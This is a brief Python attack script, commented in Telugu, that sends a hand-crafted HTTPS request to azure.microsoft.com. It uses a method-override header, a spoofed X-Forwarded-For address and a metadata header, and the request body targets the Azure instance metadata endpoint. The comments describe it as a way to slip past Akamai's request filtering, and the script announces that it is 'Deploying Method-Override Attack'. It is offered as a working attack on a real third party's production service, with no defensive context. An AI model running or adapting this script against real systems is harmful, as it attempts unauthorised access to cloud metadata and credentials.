import socket
import ssl

host = "azure.microsoft.com"
port = 443

# 2030 "Method Overriding" Payload
# Akamai దీన్ని POST అనుకుంటుంది, కానీ Azure దీన్ని GET లాగా చూస్తుంది
payload = (
    "POST /en-us/ HTTP/1.1\r\n"
    "Host: azure.microsoft.com\r\n"
    "X-HTTP-Method-Override: GET\r\n" # అసలు మెథడ్ ని ఇక్కడ దాచాం
    "X-Forwarded-For: 131.107.255.255\r\n"
    "Metadata: true\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 46\r\n"
    "Connection: close\r\n"
    "\r\n"
    "url=/metadata/instance?api-version=2021-02-01"
)

context = ssl.create_default_context()
try:
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print(f"🚀 Deploying Method-Override Attack...")
            ssock.sendall(payload.encode())
            
            res = b""
            ssock.settimeout(10)
            while True:
                try:
                    data = ssock.recv(4096)
                    if not data: break
                    res += data
                except: break
            
            print("\n📥 Response Received:")
            print(res.decode(errors='ignore'))
except Exception as e:
    print(f"❌ Error: {e}")
